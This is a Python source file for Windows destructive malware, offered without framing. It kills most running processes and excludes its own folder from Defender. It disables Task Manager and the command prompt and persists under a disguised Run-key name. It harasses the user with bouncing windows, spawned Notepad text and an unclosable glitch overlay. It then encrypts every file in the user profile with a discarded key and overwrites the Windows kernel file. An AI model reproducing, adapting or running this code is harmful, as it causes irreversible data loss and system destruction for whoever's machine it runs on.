import tkinter as tk
import random
import threading
import ctypes
import os
import pygame
import getpass
import sys
import winreg
import subprocess
import pyautogui
import psutil
import time
from ctypes import wintypes
from pathlib import Path
from cryptography.fernet import Fernet

user = getpass.getuser()
key = Fernet.generate_key()
path = Path(__file__).resolve().parent

pygame.mixer.init()

def kill():
    current_pid = os.getpid()
    whitelist = [
        "explorer.exe", "taskhostw.exe", "dwm.exe", "svchost.exe", 
        "wininit.exe", "services.exe", "lsass.exe", "csrss.exe", 
        "winlogon.exe", "py.exe", f"{os.path.abspath(sys.executable)}"
    ]
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pinfo = proc.info
            if pinfo['name'].lower() not in whitelist and pinfo['pid'] != current_pid:
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

def pop():
    for _ in range(10):
        subprocess.Popen(["notepad.exe"])
        time.sleep(0.5)
        pyautogui.write("YOU ARE DOOMED!!!", interval=0.02)
        time.sleep(1)


def bounce():
    user32 = ctypes.windll.user32
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
    active_windows = []

    def enum_handler(hwnd, lParam):
        if user32.IsWindowVisible(hwnd) and user32.GetWindowTextLengthW(hwnd) > 0:
            rect = wintypes.RECT()
            user32.GetWindowRect(hwnd, ctypes.byref(rect))
            active_windows.append({
                'hwnd': hwnd,
                'x': float(rect.left),
                'y': float(rect.top),
                'w': rect.right - rect.left,
                'h': rect.bottom - rect.top,
                'dx': random.choice([-10, -7, 7, 10]),
                'dy': random.choice([-10, -7, 7, 10])
            })
        return True

    user32.EnumWindows(WNDENUMPROC(enum_handler), 0)
    sw, sh = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

    try:
        while True:
            for win in active_windows:
                win['x'] += win['dx']
                win['y'] += win['dy']
                if win['x'] + win['w'] >= sw or win['x'] <= 0:
                    win['dx'] *= -1
                if win['y'] + win['h'] >= sh or win['y'] <= 0:
                    win['dy'] *= -1
                user32.SetWindowPos(win['hwnd'], 0, int(win['x']), int(win['y']), 0, 0, 0x0001 | 0x0004)
            time.sleep(0.01)
    except KeyboardInterrupt:
        pass

def overlay():
    global root
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.attributes('-alpha', 1)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind("<FocusOut>", lambda e: root.focus_force())

    canvas = tk.Canvas(root, highlightthickness=0, bd=0)
    canvas.pack(fill=tk.BOTH, expand=True)

    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()

    def loop():
        canvas.delete('g')

        for _ in range(random.randint(20, 90)):
            r = random.random()
            color = f'#{random.randint(30,255):02x}{random.randint(30,255):02x}{random.randint(30,255):02x}'

            if r < 0.4:
                w = random.randint(10, 360)
                h = random.randint(6, 220)
                x = random.randint(-40, sw)
                y = random.randint(-40, sh)
                canvas.create_rectangle(x, y, x + w, y + h, fill=color, outline='', tags='g')

            elif r < 0.65:
                y = random.randint(0, sh)
                h = random.randint(4, 40)
                for i in range(random.randint(6, 20)):
                    dx = random.randint(-80, 80)
                    canvas.create_rectangle(
                        dx, y + i * h,
                        sw + dx, y + (i + 1) * h,
                        fill=color, outline='', tags='g'
                    )

            elif r < 0.85:
                for _ in range(random.randint(60, 180)):
                    x = random.randint(0, sw)
                    y = random.randint(0, sh)
                    s = random.randint(1, 6)
                    canvas.create_rectangle(x, y, x + s, y + s,
                                            fill=color, outline='', tags='g')

            else:
                y = random.randint(0, sh)
                offset = random.randint(-120, 120)
                canvas.create_rectangle(
                    offset, y,
                    sw + offset, y + random.randint(8, 24),
                    fill=color, outline='', tags='g'
                )

        if random.random() < 0.35:
            canvas.delete('all')

        root.after(16, loop)

    loop()
    root.mainloop()

def again():
    try:
        for dirpath, dirnames, filenames in os.walk(f"C:\\Users\\{user}"):
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                with open(filepath, "rb") as f:
                    contents = f.read()
                encrypted = Fernet(key).encrypt(contents)
                with open(filepath, "wb") as w:
                    w.write(encrypted)
        except Exception:
            pass

    info("Info", "All your personal files have been encrypted. Enjoy the last 5 minutes of your PC!!!")
    threading.Thread(target=destruction, daemon=True).start()
    wait(300)

def destruction():
    os.system('powershell takeown /f C:/Windows/system32/ntoskrnl.exe')
    os.system(f'powershell icacls C:/Windows/system32/ntoskrnl.exe /grant {user}:F')
    with open("C:/Windows/system32/ntoskrnl.exe", "w") as f:
        for _ in range(10):
            num = random.randint(1, 100)
            f.write(str(num))

def startup():
        exe_path = os.path.abspath(sys.executable)

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(key, "WindowsServiceHost", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)

def schedule(x, name):
    threading.Timer(x, name).start()

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def disable():
        key1 = winreg.CreateKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
        )
        winreg.SetValueEx(key1, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key1)

        key2 = winreg.CreateKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\\Policies\\Microsoft\\Windows\\System"
        )
        winreg.SetValueEx(key2, "DisableCMD", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key2)

def sound(filename, loop=True):
    try:
        sound_file = resource_path(filename)
        s = pygame.mixer.Sound(sound_file)
        s.play(loops=-1 if loop else 0)
    except:
        pass

def wait(seconds):
    global root
    if root:
        root.after(int(seconds*1000), oops)

def oops():
    os.system('taskkill /f /im svchost.exe')

def sth(image_path):
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINFILE = 0x01
    SPIF_SENDCHANGE = 0x02
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        image_path,
        SPIF_UPDATEINFILE | SPIF_SENDCHANGE
)

def payload():
    global counter
    kill()    
    os.system(f'powershell Set-MpPreference -ExclusionPath {path}')
    threading.Thread(target=disable, daemon=True).start()
    threading.Thread(target=bounce, daemon=True).start()
    threading.Thread(target=pop, daemon=True).start()
    threading.Thread(target=startup, daemon=True).start()
    threading.Thread(target=sth, args=(resource_path("image.png"),), daemon=True).start()
    threading.Thread(target=sound, args=("audio.mp3",), daemon=True).start()
    schedule(10, overlay)
    counter = 1
    wait(176)

def info(title, text):
    MB_OK = 0x00
    MB_ICONINFORMATION = 0x40
    style = MB_OK | MB_ICONINFORMATION
    ctypes.windll.user32.MessageBoxW(0, text, title, style)



if __name__ == "__main__":
    try:
        counter
        threading.Thread(target=sound, args=("music.mp3",), daemon=True).start()
        again()
    except NameError:
        payload()
